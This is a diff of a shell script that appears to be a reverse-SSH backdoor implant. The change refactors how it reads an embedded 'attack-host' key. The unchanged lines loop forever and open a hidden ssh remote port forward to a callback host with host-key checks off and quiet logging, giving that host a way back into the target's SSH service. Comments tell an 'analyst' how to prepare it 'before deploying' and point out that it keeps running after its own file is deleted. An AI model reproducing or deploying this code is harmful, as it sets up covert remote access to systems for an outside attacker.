@@ -12,12 +12,10 @@ get_value () {
 	echo "$INFO" | cut -f "$1" -d ":"
 }
 
-jumpto () {
-	label="$1"
-	cmd=$(sed -n "/$label:/{:a;n;p;ba};" "$0" | grep -v ':$')
-	eval "$cmd"
-	exit
-}
+# Read the attack-host pubkey (base64, at the bottom of this file) once,
+# before the loop starts — so it's cached in memory and still usable even
+# after this file is deleted from disk mid-run.
+B64_PUBKEY=$(sed -n '/^BEGIN_B64$/,/^END_B64$/p' "$0" | sed '1d;$d')
 
 while true
 do
@@ -34,9 +32,7 @@ do
 				sleep "$SLEEP2"
 				continue
 			fi
-			jumpto encoded
-			resume:
-			echo "$b64" | base64 -d > "$KEY"
+			echo "$B64_PUBKEY" | base64 -d > "$KEY"
 			chmod 600 "$KEY"
 			ssh -o LogLevel=quiet -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$CB_PORT" -R "127.0.0.1:${REMLIS}:127.0.0.1:${TARSSH}" -i "$KEY" -N "$CB_IP" -l "$REMUSR" &
 			SSH_PID=$!
@@ -48,11 +44,10 @@ do
 	done
 done
 
-encoded:
-# Analyst: replace the line below before deploying — delete it, then in vim
-# run :r !base64 /path/to/pub/key/on/attack_host (adjust path to your keypair)
-b64=$(cat <<EOF
+exit 0
+
+# Analyst: replace the placeholder line below before deploying — delete it,
+# then in vim run :r !base64 /path/to/pub/key/on/attack_host (adjust path)
+BEGIN_B64
 :r ! base64 /path/to/pub/key/on/attack_host
-EOF
-)
-jumpto resume
+END_B64
